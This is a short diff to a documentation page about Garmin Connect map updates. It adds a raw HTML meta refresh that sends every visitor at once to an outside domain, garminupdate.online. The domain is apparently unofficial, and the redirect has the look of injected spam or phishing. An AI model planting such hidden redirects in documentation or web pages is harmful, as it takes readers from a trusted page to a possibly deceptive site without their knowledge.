@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Garmin Connect Map Update: How to Manage and Sync Maps with Your Garmin Device
 =======================================================
 
